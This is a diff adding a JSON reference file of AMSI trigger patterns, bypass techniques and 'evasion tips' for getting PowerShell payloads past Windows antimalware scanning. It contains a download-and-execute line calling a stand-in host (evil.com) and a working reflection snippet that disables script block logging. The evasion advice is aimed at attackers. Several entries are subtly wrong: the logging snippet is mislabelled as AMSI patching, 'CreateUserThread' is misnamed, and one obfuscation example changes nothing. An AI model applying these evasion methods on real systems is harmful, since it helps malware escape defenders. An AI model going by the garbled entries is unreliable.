@@ -1,0 +1,175 @@
+{
+  "description": "AMSI (Antimalware Scan Interface) trigger patterns and bypass techniques",
+  "trigger_patterns": [
+    {
+      "category": "PowerShell Obfuscation",
+      "patterns": [
+        {
+          "trigger": "-enc",
+          "description": "Base64 encoded PowerShell commands",
+          "risk": "high",
+          "example": "powershell -enc SGVsbG8gV29ybGQ="
+        },
+        {
+          "trigger": "-e",
+          "description": "Short form of -EncodedCommand",
+          "risk": "high"
+        },
+        {
+          "trigger": "bypass",
+          "description": "ExecutionPolicy bypass attempts",
+          "risk": "medium",
+          "example": "Set-ExecutionPolicy Bypass"
+        },
+        {
+          "trigger": "DownloadString",
+          "description": "Web download operations",
+          "risk": "high",
+          "example": "(New-Object Net.WebClient).DownloadString('http://evil.com/payload')"
+        },
+        {
+          "trigger": "IEX",
+          "description": "Invoke-Expression for dynamic execution",
+          "risk": "high",
+          "example": "IEX (Get-Content payload.ps1)"
+        }
+      ]
+    },
+    {
+      "category": "Script Content",
+      "patterns": [
+        {
+          "trigger": "System.Reflection.Assembly",
+          "description": ".NET assembly loading",
+          "risk": "medium",
+          "example": "[System.Reflection.Assembly]::Load($bytes)"
+        },
+        {
+          "trigger": "VirtualAlloc",
+          "description": "Direct API calls for memory allocation",
+          "risk": "high",
+          "example": "[DllImport(\"kernel32.dll\")] static extern IntPtr VirtualAlloc"
+        },
+        {
+          "trigger": "WriteProcessMemory",
+          "description": "Process injection APIs",
+          "risk": "high"
+        },
+        {
+          "trigger": "CreateUserThread",
+          "description": "Thread creation APIs",
+          "risk": "high"
+        },
+        {
+          "trigger": "DllImport",
+          "description": "Win32 API imports",
+          "risk": "medium",
+          "example": "[DllImport(\"kernel32.dll\")]"
+        }
+      ]
+    },
+    {
+      "category": "Known Tool Signatures",
+      "patterns": [
+        {
+          "trigger": "Invoke-Mimikatz",
+          "description": "Mimikatz PowerShell wrapper",
+          "risk": "critical"
+        },
+        {
+          "trigger": "Invoke-Shellcode",
+          "description": "PowerSploit shellcode injection",
+          "risk": "critical"
+        },
+        {
+          "trigger": "PowerView",
+          "description": "AD enumeration tool",
+          "risk": "high"
+        },
+        {
+          "trigger": "Invoke-BloodHound",
+          "description": "BloodHound data collector",
+          "risk": "high"
+        }
+      ]
+    },
+    {
+      "category": "Encoding Patterns",
+      "patterns": [
+        {
+          "trigger": "FromBase64String",
+          "description": "Base64 decoding operations",
+          "risk": "medium",
+          "example": "[Convert]::FromBase64String($encoded)"
+        },
+        {
+          "trigger": "ASCII.GetString",
+          "description": "Byte array to string conversion",
+          "risk": "medium"
+        },
+        {
+          "trigger": "[char[]]",
+          "description": "Character array manipulation for obfuscation",
+          "risk": "medium"
+        }
+      ]
+    }
+  ],
+  "bypass_techniques": [
+    {
+      "name": "AMSI Provider Patching",
+      "description": "Patch AMSI scanning functions in memory",
+      "implementation": "Overwrite AmsiScanBuffer or AmsiOpenSession functions",
+      "detection_risk": "High",
+      "example_code": "$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like \"*Utils\") {$c=$b}};$d=$c.GetField(\"cachedGroupPolicySettings\",\"NonPublic,Static\");If ($d) {$e=$d.GetValue($null);$e[\"HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging\"][\"EnableScriptBlockLogging\"]=0;$e[\"HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging\"][\"EnableScriptBlockInvocationLogging\"]=0}"
+    },
+    {
+      "name": "Context Confusion",
+      "description": "Execute code in contexts where AMSI doesn't scan",
+      "implementation": "Use COM objects, WMI, or other execution contexts",
+      "detection_risk": "Medium",
+      "examples": [
+        "Execute via WMI (Win32_Process.Create)",
+        "Use DynamicInvoke with method pointers",
+        "Execute in different PowerShell runspaces"
+      ]
+    },
+    {
+      "name": "String Obfuscation",
+      "description": "Obfuscate trigger strings to avoid signature detection",
+      "implementation": "String concatenation, encoding, variable substitution",
+      "detection_risk": "Low-Medium",
+      "examples": [
+        "'Invoke'+'Expression' instead of IEX",
+        "Variable substitution: $i='IEX'; &$i",
+        "Character replacement: 'DownloadString'.Replace('d','d')"
+      ]
+    },
+    {
+      "name": "Alternative Languages",
+      "description": "Use languages that bypass PowerShell AMSI",
+      "implementation": "Execute via C#, JScript, VBScript, or compiled binaries",
+      "detection_risk": "Low",
+      "examples": [
+        "Compile C# code with Add-Type",
+        "Use rundll32 with custom DLLs",
+        "Execute via MSBuild inline tasks"
+      ]
+    },
+    {
+      "name": "Memory Stream Execution",
+      "description": "Load and execute code from memory streams",
+      "implementation": "Use reflection to load assemblies from memory",
+      "detection_risk": "Medium",
+      "example_code": "[System.Reflection.Assembly]::Load([System.IO.File]::ReadAllBytes($path))"
+    }
+  ],
+  "evasion_tips": [
+    "Avoid known trigger words in script content",
+    "Break up suspicious strings across multiple variables",
+    "Use PowerShell's built-in cmdlets for obfuscation",
+    "Consider executing from different contexts (COM, WMI)",
+    "Use compiled languages when possible",
+    "Test payloads with Test-AmsiTrigger or similar tools"
+  ]
+}
